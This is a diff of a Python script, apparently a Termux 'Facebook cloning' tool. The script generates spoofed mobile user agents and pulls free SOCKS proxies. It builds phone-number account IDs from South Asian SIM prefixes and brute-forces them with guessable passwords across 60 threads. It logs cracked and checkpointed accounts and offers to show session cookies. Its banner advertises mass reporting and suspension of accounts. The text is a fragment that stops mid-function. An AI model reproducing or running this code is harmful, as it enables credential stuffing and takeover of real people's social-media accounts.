+    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+    ugen2.append(uaku)
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=' en-us; GT-'
+	 d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+for x in range(10):
+    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+    b=random.randrange(100, 9999)
+    c=random.randrange(100, 9999)
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    h=random.randrange(1, 9)
+    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
+    j=random.randrange(1, 9)
+    k=random.randrange(1, 9)
+    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
+    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+def uaku():
+    try:
+        ua=open('user-agents.txt','r').read().splitlines()
+        for ub in ua:
+            ugen.append(ub)
+    except:
+        a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
+        ua=open('user-agents.txt','w')
+        aa=re.findall('line">(.*?)<',str(a))
+        for un in aa:
+            ua.write(un+'\n')
+        ua=open('user-agents.txt','r').read().splitlines()
+        #--------------------[ CONVERTER-BULAN ]--------------#
 
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+date = str(tgl)+'/'+str(bln)+'/'+str(thn)
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
 
+#------------------[ MACHINE-SUPPORT ]---------------#
 
+def alvino_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+def clear():
+    os.system('clear')
+def back():
+    login()
+def contact():
+   # os.system('xdg-open ')
+    back()
+def linex():
+    print('\033[1;91m----------------------------------------------')
+def animation(u):
+    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
+#------------------[ LOGO-LAKNAT ]-----------------#
 
+logo = (f"""\x1b[1;97m
+\x1b[1;92m▶𝗫𝗗
+\x1b[1;97m  
+__  __  _____  ___    ___    _
+|  \/  || ____|/ _ \  ( _ )  | |
+| |\/| ||  _| | | | | / _ \  | |
+| |  | || |___| |_| || (_) | |_|
+|_|  |_||_____|\___/  \___/  (_)
 
-#------------------[ COLOR ]-----------------#
-B = '\x1b[10;90m';R = '\x1b[10;91m';G = '\x1b[10;92m';H = '\x1b[10;93m';BL = '\x1b[10;94m';BG = '\x1b[10;95m';S = '\x1b[10;96m';W = '\x1b[10;97m';EX = '\x1b[0m';E = '\x1b[m'
-#------------------[ SYTLE ]-----------------#
-dt = '•'
-#------------------[ VERSION ]-----------------#
-version = '1.07'
-#------------------[ LOOP ]-----------------#
-ok = [];cp = [];twf = [];lop = 0;xode = [];plist = [];cpx = [];cokix = [];apkx = [];paswtrh = [];rcd = [];rcdx = [];ugen = [];ugtn = [];ugxn = [];lk = [];togg = []
-#------------------[ CLEAR ]-----------------#
-def clear():os.system("clear");print(logo)
-#------------------[ LINE ]-----------------#
-def line():print('===============================================')
-#------------------[ DEVICE ]-----------------#
-xxxxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
-gtxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
-gt = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
-#------------------[ WEB ]-----------------#
-fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
-#------------------[ INSTALL ]-----------------#
-os.system('pkg install sox -y')
-os.system('pkg install espeak')
-os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
-os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
-os.system('clear');os.system('espeak -a 300 "well,come to,kalyan, King send script free open tool"')
-#------------------[ DATE ]-----------------#
-dateti = str(datetime.now()).split(' ')[0]
-#------------------[ PROXY ]-----------------#
-proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-open('socksku.txt', 'w').write(proxylist)
-proxsi = open('socksku.txt', 'r').read().splitlines()
-#------------------[ KEY ]-----------------#
-
-#------------------[ DATE-CHECKER ]-----------------#
-def tutulx(fx):
-    if len(fx) == 15:
-        if fx[:10] in ['900000000']:
-            tutulxz = '2011'
-            return tutulxz
-        if fx[:9] in ['9000000000']:
-            tutulxz = '2012'
-            return tutulxz
-        if fx[:8] in ['9000000000']:
-            tutulxz = '2014'
-            return tutulxz
-        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
-            tutulxz = '2013'
-            return tutulxz
-        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
-            tutulxz = '2010'
-            return tutulxz
-        if fx[:6] in ['100001']:
-            tutulxz = '2010/2011'
-            return tutulxz
-        if fx[:6] in ['100002', '100003']:
-            tutulxz = '2011/2012'
-            return tutulxz
-        if fx[:6] in ['100004']:
-            tutulxz = '2012/2013'
-            return tutulxz
-        if fx[:6] in ['100005', '100006']:
-            tutulxz = '2013/2014'
-            return tutulxz
-        if fx[:6] in ['100007', '100008']:
-            tutulxz = '2014/2015'
-            return tutulxz
-        if fx[:6] in ['100009']:
-            tutulxz = '2012'
-            return tutulxz
-        if fx[:5] in ['10001']:
-            tutulxz = '2013'
-            return tutulxz
-        if fx[:5] in ['10002']:
-            tutulxz = '2014'
-            return tutulxz
-        if fx[:5] in ['10003']:
-            tutulxz = '2011'
-            return tutulxz
-        if fx[:5] in ['10004']:
-            tutulxz = '2010'
-            return tutulxz
-        if fx[:5] in ['10005']:
-            tutulxz = '2012'
-            return tutulxz
-        if fx[:5] in ['10006', '10007', '10008']:
-            tutulxz = '2011/2012'
-            return tutulxz
-        tutulxz = '2012'
-        return tutulxz
-    if len(fx) in [11, 12]:
-        tutulxz = '2011/2012'
-        return tutulxz
-    if len(fx) == 14:
-        tutulxz = '2014'
-        return tutulxz
-    if len(fx) == 15:
-        tutulxz = '2015'
-        return tutulxz
-    tutulxz = '2014/2015'
-    return tutulxz
-#------------------[ SIM-CODE ]-----------------#
-BDX = f'''\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mBD SIM CODE \x1b[10;91m• {G}013 014 015 016 017 018 019{E}{W}'''
-INDX = f'''{W}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}'''
-PAKX = f'''{W}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}'''
-#------------------[ LIMIT ]-----------------#
-LIMITX = f'''[{G}+{W}] EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}'''
-#------------------[ YES/NO ]-----------------#
-CPG = f'''[{G}+{W}] Do You Went Show Cp Account (y/n)'''
-CKIG = f'''[{G}+{W}] Do You Went Show Cookie (y/n)'''
-#------------------[ CHOICE/INPUT ]-----------------#
-chc = f'''[{G}+{W}] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m '''
-flp = f'''{W}[{G}•{W}] PUT FILE PATH\x1b[1;37m : {G}'''
-#------------------[ EXAMPLE-PASS ]-----------------#
-chcps = f'''EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'''
-#------------------[ METHOD ]-----------------#
-mxxt = f'''{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'''
-#------------------[ NOT-FOUND ]-----------------#
-nflp = f'''[{R}!{W}] FILE LOCATION NOT FOUND '''
-#------------------[ LOGO ]-----------------#
-logo = f'''\r\r\x1b[0;92m
-╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\x1b[10;91m ████████\x1b[0;92m ██    ██\x1b[10;91m ████████\x1b[0;92m ██    ██\x1b[10;91m ██ \x1b[0;92m     ║
-║\x1b[10;91m    ██ \x1b[0;92m   ██    ██\x1b[10;91m    ██\x1b[0;92m    ██    ██\x1b[10;91m ██  \x1b[0;92m    ║
-║\x1b[10;91m    ██ \x1b[0;92m   ██    ██\x1b[10;91m    ██\x1b[0;92m    ██    ██\x1b[10;91m ██  \x1b[0;92m    ║
-║\x1b[10;91m    ██ \x1b[0;92m   ██    ██\x1b[10;91m    ██\x1b[0;92m    ██    ██\x1b[10;91m ██   \x1b[0;92m   ║
-║\x1b[10;91m    ██ \x1b[0;92m    ██████\x1b[10;91m     ██\x1b[0;92m     ██████\x1b[10;91m  ███████\x1b[0;92m ║
-\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \x1b[0;92m
-╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m\x1b[10;92m║
-╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;33m 
-\x1b[10;93m╠══[SEND BY             Hacker & Report group║ 
-\x1b[10;91m╠══[Bash                CYBER security TEAM  ║    
-\x1b[10;97m╠══[owner                Man Force Condom    ║   
-\x1b[10;94m╠══[work                Reporting,Disable,suspend 
-\x1b[10;95m╠══[TOOLS                    • FREE ]         ║    
-\x1b[10;93m╠══[VERSION                  • 2.1 ]          ║ \x1b[10;92m
-\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\x1b[1;31m'''
-#------------------[ NAME ]-----------------#
-#------------------[ MENU ]-----------------#
-def Main():
-    clear()
-    print('\x1b[10;92m┏━\x1b[10;97m=============================================')
-    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m1\x1b[10;97m] \x1b[10;92mReport Terget id with link\x1b[10;97m')
-    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m2\x1b[10;97m] \x1b[10;93mDelet Your Report and safe id')
-    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m0\x1b[10;97m] \x1b[10;91mBack disble or suspend id')
-    print('\x1b[10;92m┣━\x1b[10;97m=============================================')
-    os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
-    os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
-    ghx = input('\x1b[10;92m┗━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m:\x1b[10;92m ')
-    if ghx in ['A', 'a', '1']:rcd.append('1');rmenu1()
-    if ghx in ['B', 'b', '2']:rcd.append('2');rmenu1()
-    if ghx in ['C', 'c', '3']:rcd.append('3');rmenu1()
-    if ghx in ['C', 'c', '4']:rcd.append('4');rmenu1()
-    else:line();print(f'\n \t {R}Choose Valid Option{E}');time.sleep(1);Main()
-#------------------[ RANDOM-MENU ]-----------------#
-def rmenu1():
-    clear()
-    if '1' in rcd:print(f'{BDX}');line()
-    if '3' in rcd:print(f'{INDX}');line()
-    if '2' in rcd:print('                [10;92mAdmin Facebook idz');os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1');time.sleep(3)
-    code = input(f'{chc}');print(f'''\x1b[10;97m{'==============================================='}''');print(f'''{LIMITX}''');line();limit = int(input(f'[{G}+{E}] Limit : {G}'));print(f"{W}{'==============================================='}");print(f'{CPG}');line();cx = input(f'{chc}')
-    if cx in ['n', 'N', 'no', 'NO', '2']:cpx.append('n')
-    else:cpx.append('y')
-    print(f"{W}{'==============================================='}");print(f'{CKIG}');line();ckiv = input(f'{chc}')
-    if ckiv in ['n', 'N', 'no', 'NO', '2']:cokix.append('n')
-    else:cokix.append('y')
-    for number in range(limit):
-        if '1' in rcd:numberx = ''.join((random.choice(string.digits) for _ in range(8)));xode.append(numberx)
-        if '2' in rcd:numberx = ''.join((random.choice(string.digits) for _ in range(7)));xode.append(numberx)
-        if '3' in rcd:numberx = ''.join((random.choice(string.digits) for _ in range(6)));xode.append(numberx)
-    with ThreadPool(max_workers=60) as tonxoys:
-        tid = str(len(xode));clear()
-        print('\x1b[10;92m┏━\x1b[10;97m=============================================')
-        print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[38;5;208m USER NAME\x1b[10;91m :\x1b[10;96m ')
-        print(f'''\x1b[10;92m┣━{W}[{G}+{W}] \x1b[10;91mYOUR TOTAL ID :\x1b[1;92m ''' + tid)
-        print(f'''\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[10;92m Started Time Date \x1b[10;91m: \x1b[10;93m{dateti}''')
-        print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[38;5;208mUSE YOUR \x1b[10;95mAIRPLANE MODE \x1b[10;97m[\x1b[10;92mON\x1b[10;91m/\x1b[10;92mOFF\x1b[10;97m] \x1b[10;92mAFTER\x1b[10;91m-\x1b[10;92m3 MIN')
-        print('\x1b[10;92m┗━\x1b[10;97m=============================================')
-        for rngx in xode:
-            id = code + rngx
-            if '1' in rcd:psd = [id,rngx,id[:6],id[:7],id[:8],id[5:]]
-            if '2' in rcd:psd = [id,rngx,id[5:],'khan123']
-            if '3' in rcd:psd = [id,rngx,id[:6],'57273200']
-            tonxoys.submit(graphrm, id, psd, tid)
-#------------------[ METHOD-1 ]-----------------#
-def graphrm(id,psd,tid):
-    global ok,cp,lop
